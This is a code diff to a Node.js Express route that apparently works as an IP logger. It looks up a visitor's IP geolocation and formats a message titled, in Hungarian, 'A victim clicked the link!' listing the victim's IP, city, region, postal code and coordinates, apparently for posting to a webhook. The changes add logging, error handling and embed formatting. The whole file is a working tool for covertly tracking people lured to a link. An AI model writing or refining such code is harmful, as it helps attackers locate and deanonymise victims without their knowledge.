@@ -19,6 +19,9 @@ app.get('/send-ip', (req, res) => {
     fetch(`https://ipapi.co/${userIp}/json/`)
         .then(geoResponse => geoResponse.json())
         .then(geoData => {
+            console.log("GeoData:", geoData); // Kiírjuk a választ a konzolra
+
+            // Ha az adat nem érhető el, akkor "N/A"-val helyettesítjük.
             const network = geoData.network || 'N/A';
             const city = geoData.city || 'N/A';
             const region = geoData.region || 'N/A';
@@ -34,7 +37,7 @@ app.get('/send-ip', (req, res) => {
                 embeds: [
                     {
                         title: 'Egy áldozat rákattintott a linkre!',
-                        description: `**IP-cím >> **${userIp}\n**Hálózat >> ** ${network}\n**Város >> ** ${city}\n**Régió >> ** ${region}\n**Ország >> ** ${country}\n**Irányítószám >> ** ${postal}\n**Szélesség >> ** ${latitude}\n**Hosszúság >> ** ${longitude}`,
+                        description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${network}\n**Város >>** ${city}\n**Régió >>** ${region}\n**Ország >>** ${country}\n**Irányítószám >>** ${postal}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                         color: 0x800080
                     }
                 ]
@@ -50,6 +53,7 @@ app.get('/send-ip', (req, res) => {
                 });
         })
         .catch(error => {
+            console.log('Hiba történt az API hívásban:', error); // Hibakezelés
             res.send('Hiba történt az IP cím lekérdezésekor!');
         });
 });
